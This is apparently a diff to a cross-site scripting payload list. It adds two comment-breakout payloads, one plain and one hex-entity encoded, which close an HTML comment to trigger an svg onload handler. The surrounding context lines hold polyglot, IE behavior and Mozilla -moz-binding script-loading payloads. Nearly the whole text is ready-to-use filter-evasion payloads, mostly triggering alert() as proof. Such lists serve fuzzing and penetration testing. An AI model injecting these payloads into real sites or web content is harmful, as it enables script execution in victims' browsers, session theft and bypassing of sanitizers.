@@ -208,3 +208,7 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onm
 <img src="blah" style="-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)" />
 <a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(209)">XSS</a>
 <HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<img src=1 onerror=alert(210)>"> </BODY></HTML>
+
+<!--&nbsp;DEBUG:<img title="--><svg onload="alert()">"&gt;1aaaaaaaaaaaaaaaaaaa
+#结合注释符
+<!--<img title="&#x2D;&#x2D;&#x3E;&#x3C;&#x73;&#x76;&#x67;&#x2F;&#x6F;&#x6E;&#x6C;&#x6F;&#x61;&#x64;&#x3D;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x29;&#x3E;">1
